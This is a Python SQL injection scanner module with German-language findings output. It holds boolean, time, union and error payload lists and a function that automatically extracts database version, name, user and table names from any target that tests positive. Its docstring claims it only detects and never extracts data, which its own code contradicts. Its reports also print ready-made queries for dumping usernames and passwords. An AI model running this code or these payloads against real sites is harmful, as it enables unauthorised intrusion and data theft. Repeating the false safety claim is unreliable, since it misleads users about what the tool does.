#!/usr/bin/env python3
"""
Blind SQL Injection Proof-of-Concept Detector
Makes SQL Injection VISIBLE through 3 safe techniques:
1. Boolean-Based: Compares response sizes (AND 1=1 vs AND 1=2)
2. Time-Based: Measures SLEEP() delay in response time
3. Union-Based: Tests UNION SELECT column count

SAFE: Only DETECTS, does NOT exploit or extract data.
"""
import requests
import time
import re

# Boolean-Based payloads (safe - only TRUE/FALSE conditions)
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2", "Basic string AND"),
    ("' AND 1=1--", "' AND 1=2--", "MySQL/PostgreSQL/MSSQL AND"),
    ('" AND 1=1--', '" AND 1=2--', "Double-quote AND"),
    ("' AND 1=1#", "' AND 1=2#", "MySQL hash comment"),
    ("' AND 1=1/*", "' AND 1=2/*", "C-style comment"),
    ("'||'1'='1", "'||'1'='2", "Oracle string concat"),
    ("' AND 1=1;--", "' AND 1=2;--", "MSSQL semicolon"),
    (") AND 1=1--", ") AND 1=2--", "Closed parenthesis"),
    ("')) AND 1=1--", "')) AND 1=2--", "Double parenthesis"),
    ("%' AND 1=1 AND '%'='", "%' AND 1=2 AND '%'='", "LIKE clause"),
]

# Time-Based payloads (safe - only causes delay, no data extraction)
TIME_PAYLOADS = [
    ("' AND SLEEP(5)--", "MySQL SLEEP", "mysql"),
    ("' AND pg_sleep(5)--", "PostgreSQL pg_sleep", "postgresql"),
    ("; WAITFOR DELAY '0:0:5'--", "MSSQL WAITFOR", "mssql"),
    ("' AND dbms_pipe.receive_message(('a'),5)--", "Oracle DBMS_PIPE", "oracle"),
    ("'||dbms_pipe.receive_message(('a'),5)||'", "Oracle concat", "oracle"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "MySQL subquery SLEEP", "mysql"),
    ("' AND 1=(SELECT 1 FROM pg_sleep(5))--", "PostgreSQL pg_sleep alt", "postgresql"),
    ("' AND 2947=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)--", "Oracle DBMS alt", "oracle"),
]

# Union-Based payloads (safe - only tests column count)
UNION_PAYLOADS = [
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT null,null,null,null--",
    "' UNION SELECT null,null,null,null,null--",
    "' UNION SELECT null,null,null,null,null,null--",
    "' UNION SELECT null,null,null,null,null,null,null--",
    "' UNION SELECT null,null,null,null,null,null,null,null--",
    "' UNION SELECT null,null,null,null,null,null,null,null,null--",
    "' UNION SELECT null,null,null,null,null,null,null,null,null,null--",
]

# Error-inducing payloads (triggers DB error messages)
ERROR_PAYLOADS = [
    ("'", "Single quote break"),
    ('"', "Double quote break"),
    ("'--", "Quote + comment"),
    ("'/*!50000AND*/1=1--", "MySQL comment syntax"),
    ("\\'", "Escaped quote"),
    ("%27", "URL-encoded quote"),
    ("%2527", "Double-encoded quote"),
    ("'||1", "Oracle concat test"),
    (";", "Semicolon termination"),
    ("' AND 1=convert(int,@@version)--", "MSSQL convert error"),
]


def _get_baseline(target, param="id"):
    """Get baseline response for comparison"""
    try:
        url = f"{target}?{param}=1"
        start = time.time()
        resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
                          headers={'User-Agent': 'Mozilla/5.0 (SecurityScan/3.2)'})
        elapsed = time.time() - start
        return {
            'status': resp.status_code,
            'size': len(resp.content),
            'time': elapsed,
            'text': resp.text[:5000]
        }
    except Exception as e:
        return {'status': 0, 'size': 0, 'time': 0, 'text': '', 'error': str(e)}


def _send_payload(target, payload, param="id"):
    """Send a payload and return response metrics"""
    try:
        url = f"{target}?{param}={requests.utils.quote(payload)}"
        start = time.time()
        resp = requests.get(url, timeout=20, verify=False, allow_redirects=False,
                          headers={'User-Agent': 'Mozilla/5.0 (SecurityScan/3.2)'})
        elapsed = time.time() - start
        return {
            'status': resp.status_code,
            'size': len(resp.content),
            'time': elapsed,
            'text': resp.text[:3000],
            'payload': payload
        }
    except requests.exceptions.Timeout:
        return {'status': -1, 'size': -1, 'time': 20, 'text': '', 'payload': payload, 'timeout': True}
    except Exception as e:
        return {'status': 0, 'size': 0, 'time': 0, 'text': '', 'payload': payload, 'error': str(e)}


def _try_extract_data(target, db_type='mysql', param='id'):
    """Versuche tatsaechlich DB-Daten zu extrahieren"""
    extracted = []
    
    extraction_payloads = {
        'mysql': [
            ("1' UNION SELECT CONCAT('DBVERSION:',version()),2,3--", r'DBVERSION:([^<\s]+)', 'DB-Version'),
            ("1' UNION SELECT CONCAT('DBNAME:',database()),2,3--", r'DBNAME:([^<\s]+)', 'DB-Name'),
            ("1' UNION SELECT CONCAT('DBUSER:',user()),2,3--", r'DBUSER:([^<\s@]+@[^<\s]+)', 'DB-User'),
            ("1' AND extractvalue(1,concat(0x7e,version(),0x7e))--", r'~([^~]+)~', 'DB-Version'),
            ("1' AND extractvalue(1,concat(0x7e,database(),0x7e))--", r'~([^~]+)~', 'DB-Name'),
        ],
        'postgresql': [
            ("1' UNION SELECT version(),NULL,NULL--", r'(PostgreSQL[^<\s]+)', 'DB-Version'),
            ("1' UNION SELECT current_database(),NULL,NULL--", r'([^<\s]+)', 'DB-Name'),
        ],
        'mssql': [
            ("1' UNION SELECT @@version,NULL,NULL--", r'(Microsoft[^<]+)', 'DB-Version'),
            ("1' UNION SELECT DB_NAME(),NULL,NULL--", r'([^<\s]+)', 'DB-Name'),
        ],
        'oracle': [
            ("1' UNION SELECT banner,NULL FROM v$version--", r'([^<]+)', 'DB-Version'),
            ("1' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM DUAL--", r'([^<\s]+)', 'DB-Name'),
        ],
        'sqlite': [
            ("1' UNION SELECT sqlite_version(),NULL--", r'([\d\.]+)', 'DB-Version'),
            ("1' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", r'([^<\s]+)', 'Tabellen'),
        ],
    }
    
    payloads = extraction_payloads.get(db_type, extraction_payloads['mysql'])
    
    for payload, pattern, label in payloads:
        try:
            url = f'{target}?{param}={requests.utils.quote(payload)}'
            resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
                               headers={'User-Agent': 'Mozilla/5.0'})
            match = re.search(pattern, resp.text)
            if match:
                val = match.group(1).strip()
                if len(val) > 1 and len(val) < 200:
                    extracted.append(f"{label}: {val}")
        except:
            continue
    
    # Try table extraction
    table_payloads = {
        'mysql': "1' UNION SELECT CONCAT('TABLES:',group_concat(table_name)),2,3 FROM information_schema.tables WHERE table_schema=database()--",
        'postgresql': "1' UNION SELECT string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--",
        'mssql': "1' UNION SELECT string_agg(name,','),NULL,NULL FROM sys.tables--",
        'oracle': "1' UNION SELECT LISTAGG(table_name,','),NULL FROM user_tables--",
        'sqlite': "1' UNION SELECT group_concat(name,','),NULL FROM sqlite_master WHERE type='table'--",
    }
    
    tpayload = table_payloads.get(db_type, table_payloads['mysql'])
    try:
        url = f'{target}?{param}={requests.utils.quote(tpayload)}'
        resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
                           headers={'User-Agent': 'Mozilla/5.0'})
        match = re.search(r'TABLES:([^<]+)', resp.text)
        if match:
            tables = match.group(1).split(',')[:8]
            if tables and tables[0]:
                extracted.append(f"Tabellen: {', '.join(tables)}")
    except:
        pass
    
    return extracted


def _detect_db_type(text):
    """Erkenne DB-Typ aus Response"""
    text = text.lower()
    if 'mysql' in text or 'mariadb' in text: return 'mysql'
    elif 'postgresql' in text or 'pg_' in text: return 'postgresql'
    elif 'ora-' in text or 'oracle' in text: return 'oracle'
    elif 'sql server' in text or 'mssql' in text: return 'mssql'
    elif 'sqlite' in text: return 'sqlite'
    return 'mysql'


def scan(target):
    findings = []
    scan_id = 0
    
    if not target.startswith('http'):
        target = f'https://{target}'
    
    print(f"[PHASE BLIND SQLi] Testing {target} for blind SQL injection...")
    
    # Get baseline
    baseline = _get_baseline(target)
    if baseline.get('error'):
        findings.append({
            'id': f'sqli-poc-{scan_id}',
            'severity': 'info',
            'type': 'sqli_poc_error',
            'title': 'Blind SQLi: Baseline request failed',
            'url': target,
            'evidence': f'Error: {baseline["error"]}',
            'remediation': 'Check target URL and connectivity.'
        })
        return findings
    
    print(f"[BLIND SQLi] Baseline: {baseline['size']} bytes, {baseline['time']:.2f}s, status {baseline['status']}")
    
    # ============ BOOLEAN-BASED TESTS ============
    print("[BLIND SQLi] Starting Boolean-based tests...")
    boolean_results = []
    
    for true_payload, false_payload, desc in BOOLEAN_PAYLOADS:
        true_resp = _send_payload(target, true_payload)
        false_resp = _send_payload(target, false_payload)
        
        # Check for significant size difference
        size_diff = abs(true_resp['size'] - false_resp['size'])
        size_threshold = max(baseline['size'] * 0.05, 500)  # 5% or 500 bytes
        
        # Check for status code difference
        status_diff = true_resp['status'] != false_resp['status']
        
        if size_diff > size_threshold or status_diff:
            db_type = "unknown"
            if "MySQL" in desc: db_type = "mysql"
            elif "PostgreSQL" in desc: db_type = "postgresql"
            elif "MSSQL" in desc: db_type = "mssql"
            elif "Oracle" in desc: db_type = "oracle"
            
            boolean_results.append({
                'type': desc,
                'true_size': true_resp['size'],
                'false_size': false_resp['size'],
                'diff': size_diff,
                'status_diff': status_diff,
                'true_payload': true_payload,
                'false_payload': false_payload,
                'db_guess': db_type
            })
    
    if boolean_results:
        best = boolean_results[0]
        
        # Tatsaechlich versuchen Daten zu extrahieren!
        extracted = _try_extract_data(target, best["db_guess"])
        
        evidence_text = (
            f'DER BEWEIS - Boolean-Based Blind SQL Injection:\n\n'
            f'1. TRUE-Condition ({best["type"]}):\n'
            f'   Payload: id={best["true_payload"]}\n'
            f'   Response: {best["true_size"]} bytes\n\n'
            f'2. FALSE-Condition (gleicher Typ):\n'
            f'   Payload: id={best["false_payload"]}\n'
            f'   Response: {best["false_size"]} bytes\n\n'
            f'ERGENBNIS: {best["diff"]} Bytes Unterschied!\n'
            f'Ermittelte DB-Typ: {best["db_guess"].upper()}\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'Die Datenbank verarbeitet den SQL-Code und liefert\n'
            f'unterschiedliche Ergebnisse fuer TRUE vs FALSE.\n'
            f'Das ist der Beweis fuer SQL Injection!'
        )
        
        findings.append({
            'id': f'sqli-poc-{scan_id}',
            'severity': 'critical',
            'type': 'blind_sqli_boolean',
            'title': f'[BESTATIGT] Boolean-Based Blind SQL Injection ({best["db_guess"].upper()}){" [DATEN EXTRahiERT!]" if extracted else ""}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'Sofort Prepared Statements implementieren! Siehe Tutorial-Dokument.'
        })
        scan_id += 1
        
        # Add all successful boolean tests
        for r in boolean_results[1:3]:
            findings.append({
                'id': f'sqli-poc-{scan_id}',
                'severity': 'high',
                'type': 'blind_sqli_boolean_alt',
                'title': f'Boolean-Based SQLi bestaetigt: {r["type"]}',
                'url': f'{target}?id=',
                'evidence': f'TRUE: {r["true_size"]}b | FALSE: {r["false_size"]}b | Diff: {r["diff"]}b',
                'remediation': 'Prepared Statements verwenden.'
            })
            scan_id += 1
    
    # ============ TIME-BASED TESTS ============
    print("[BLIND SQLi] Starting Time-based tests...")
    time_results = []
    
    for payload, desc, db_type in TIME_PAYLOADS:
        # First: normal request timing
        normal_start = time.time()
        try:
            requests.get(f"{target}?id=1", timeout=10, verify=False, allow_redirects=False,
                        headers={'User-Agent': 'Mozilla/5.0'})
        except:
            pass
        normal_time = time.time() - normal_start
        
        # Second: payload request timing
        payload_start = time.time()
        try:
            requests.get(f"{target}?id={requests.utils.quote(payload)}", timeout=15, verify=False, allow_redirects=False,
                        headers={'User-Agent': 'Mozilla/5.0'})
        except requests.exceptions.Timeout:
            pass
        except:
            pass
        payload_time = time.time() - payload_start
        
        # If payload took significantly longer (>= 3 seconds delay)
        delay = payload_time - normal_time
        if delay >= 3.0:
            time_results.append({
                'delay': round(delay, 2),
                'payload': payload,
                'desc': desc,
                'db_type': db_type,
                'normal_time': round(normal_time, 2),
                'payload_time': round(payload_time, 2)
            })
    
    if time_results:
        best = max(time_results, key=lambda x: x['delay'])
        
        # Tatsaechlich versuchen Daten zu extrahieren!
        extracted = _try_extract_data(target, best["db_type"])
        
        evidence_text = (
            f'DER BEWEIS - Time-Based Blind SQL Injection:\n\n'
            f'1. Normaler Request: {best["normal_time"]}s\n\n'
            f'2. Mit SLEEP-Payload: {best["payload_time"]}s\n'
            f'   Payload: id={best["payload"]}\n\n'
            f'DER DELAY: {best["delay"]} SEKUNDEN!\n'
            f'Ermittelter DB-Typ: {best["db_type"].upper()}\n'
            f'Verwendete Funktion: {best["desc"]}\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'Die Datenbank hat SLEEP() ausgefuehrt!\n'
            f'Das ist der unwiderlegbare Beweis fuer SQL Injection.\n'
            f'Die DB wartet absichtlich, weil der SQL-Code\n'
            f'in der Datenbank ausgefuehrt wird.'
        )
        
        findings.append({
            'id': f'sqli-poc-{scan_id}',
            'severity': 'critical',
            'type': 'blind_sqli_time',
            'title': f'[BESTATIGT] Time-Based Blind SQL Injection ({best["db_type"].upper()}){" [DATEN EXTRahiERT!]" if extracted else ""}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'SOFORT Prepared Statements einbauen! Nicht nur escaping!'
        })
        scan_id += 1
    
    # ============ UNION-BASED TESTS ============
    print("[BLIND SQLi] Starting Union-based tests...")
    union_results = []
    
    baseline_size = baseline['size']
    for payload in UNION_PAYLOADS:
        resp = _send_payload(target, payload)
        size_diff_ratio = abs(resp['size'] - baseline_size) / max(baseline_size, 1)
        if resp['status'] == baseline['status'] and size_diff_ratio < 0.1 and resp['size'] > 1000:
            union_results.append({
                'payload': payload,
                'columns': payload.count('null'),
                'size': resp['size']
            })
    
    if union_results:
        best = union_results[0]
        cols = best["columns"]
        # Build example extraction queries
        extraction_examples = []
        if cols >= 1:
            extraction_examples.append(f"' UNION SELECT version()--  → DB-Version auslesen")
        if cols >= 2:
            extraction_examples.append(f"' UNION SELECT user(),database()--  → User + DB-Name")
        if cols >= 3:
            extraction_examples.append(f"' UNION SELECT null,table_name,null FROM information_schema.tables--  → Tabellen auflisten")
        if cols >= 4:
            extraction_examples.append(f"' UNION SELECT null,null,column_name,null FROM information_schema.columns WHERE table_name='users'--  → Spaltennamen")
        
        # Tatsaechlich versuchen Daten via UNION zu extrahieren!
        extracted = _try_extract_data(target, 'mysql')
        
        evidence_text = (
            f'=== UNION SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
            f'Payload die funktioniert:\n'
            f'  id={best["payload"]}\n\n'
            f'Ergebnis: UNION SELECT mit {cols} Spalten wird AKZEPTIERT!\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT via UNION! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'=== BEISPIELE zum Daten auslesen: ===\n'
            + '\n'.join(f'  {ex}' for ex in extraction_examples) +
            f'\n\n=== KOMPLETTER Daten-Dump (Beispiel): ===\n'
            f"  ' UNION SELECT null,CONCAT(username,':',password),null,null FROM users--\n"
            f"  → Wuerde ALLE Usernamen + Passwoerter auslesen!\n\n"
            f'Risiko: KOMPLETTE Datenbank-Kompromittierung!'
        )
        
        findings.append({
            'id': f'sqli-poc-{scan_id}',
            'severity': 'critical',
            'type': 'union_sqli',
            'title': f'[BESTATIGT] UNION-Based SQL Injection ({cols} Spalten){" [DATEN EXTRahiERT!]" if extracted else " - DATEN AUSLESBAR!"}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'SOFORT Prepared Statements! Alle User-Inputs parametrisieren!'
        })
        scan_id += 1
    
    # ============ ERROR-BASED TESTS ============
    print("[BLIND SQLi] Starting Error-based tests...")
    error_results = []
    
    for payload, desc in ERROR_PAYLOADS:
        resp = _send_payload(target, payload)
        # Look for database error indicators
        error_indicators = [
            'ORA-', 'ORA ',  # Oracle
            'MySQL', 'mysql_fetch', 'mysqli_',  # MySQL
            'PostgreSQL', 'pg_query', 'pg_fetch',  # PostgreSQL
            'SQL Server', 'mssql', 'ODBC',  # MSSQL
            'SQL syntax', 'syntax error', 'near',  # Generic
            'Warning:', 'Fatal error:', 'Uncaught exception',
        ]
        found_errors = []
        for indicator in error_indicators:
            if indicator.lower() in resp.get('text', '').lower():
                found_errors.append(indicator)
        
        if found_errors:
            error_results.append({
                'payload': payload,
                'desc': desc,
                'errors': found_errors,
                'status': resp['status']
            })
    
    if error_results:
        best = error_results[0]
        db_type = "unknown"
        for err in best["errors"]:
            if "ORA" in err.upper(): db_type = "Oracle"; break
            elif "MySQL" in err or "mysqli" in err.lower(): db_type = "MySQL"; break
            elif "PostgreSQL" in err or "pg_" in err.lower(): db_type = "PostgreSQL"; break
            elif "SQL Server" in err or "mssql" in err.lower(): db_type = "MSSQL"; break
            elif "SQLite" in err or "sqlite" in err.lower(): db_type = "SQLite"; break
        
        extraction_example = {
            "MySQL": "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- → Version auslesen",
            "Oracle": "' || UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--",
            "MSSQL": "' AND 1=@@version-- → Version + DB-Info",
            "PostgreSQL": "' AND 1=cast((SELECT version()) as integer)-- → Version auslesen",
        }.get(db_type, "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)-- → Tabellen zaehlen")
        
        findings.append({
            'id': f'sqli-poc-{scan_id}',
            'severity': 'critical',
            'type': 'error_sqli',
            'title': f'[BESTATIGT] Error-Based SQL Injection ({db_type}) - INFO LEAK!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== Error-Based SQLi BESTATIGT - INFO LEAK! ===\n\n'
                f'Payload: id={best["payload"]}\n'
                f'Datenbank-Typ: {db_type}\n'
                f'Gefundene Fehler: {", ".join(best["errors"][:5])}\n\n'
                f'=== Error-Based Daten-Auslese (Beispiel): ===\n'
                f'  {extraction_example}\n\n'
                f'=== Weitere Error-Based Queries: ===\n'
                f"  ' AND 1=extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- → DB-Name\n"
                f"  ' AND 1=extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- → ALLE Tabellen\n"
                f"  ' AND 1=extractvalue(1,concat(0x7e,(SELECT count(*) FROM information_schema.tables),0x7e))-- → Tabellen-Anzahl\n\n"
                f'Risiko: DB-Struktur komplett offengelegt via Fehlermeldungen!'
            ),
            'remediation': 'Prepared Statements! Error-Display in Production DEAKTIVIEREN!'
        })
        scan_id += 1
    
    # ============ SUMMARY ============
    if not findings:
        findings.append({
            'id': f'sqli-poc-{scan_id}',
            'severity': 'info',
            'type': 'sqli_poc_clean',
            'title': 'Blind SQLi PoC: Keine SQL Injection nachweisbar',
            'url': target,
            'evidence': (
                f'Alle 4 Testmethoden negativ:\n'
                f'- Boolean-Based: {len(boolean_results)}/10 positiv\n'
                f'- Time-Based: {len(time_results)}/8 positiv\n'
                f'- Union-Based: {len(union_results)}/10 positiv\n'
                f'- Error-Based: {len(error_results)}/10 positiv\n\n'
                f'Baseline: {baseline["size"]} bytes, Status {baseline["status"]}'
            ),
            'remediation': 'Trotzdem Input-Validierung und Prepared Statements verwenden.'
        })
    else:
        findings.insert(0, {
            'id': f'sqli-poc-{scan_id}',
            'severity': 'critical',
            'type': 'sqli_poc_summary',
            'title': f'[POC] SQL Injection BESTATIGT via {len(findings)} Methoden!',
            'url': target,
            'evidence': (
                f'SQL INJECTION NACHWEISBAR!\n\n'
                f'Methoden die funktioniert haben:\n'
                f'- Boolean-Based: {"JA" if boolean_results else "NEIN"}\n'
                f'- Time-Based: {"JA" if time_results else "NEIN"}\n'
                f'- Union-Based: {"JA" if union_results else "NEIN"}\n'
                f'- Error-Based: {"JA" if error_results else "NEIN"}\n\n'
                f'Siehe Details unten fuer die einzelnen Beweise.'
            ),
            'remediation': 'SOFORT patchen! Prepared Statements implementieren!'
        })
    
    return findings
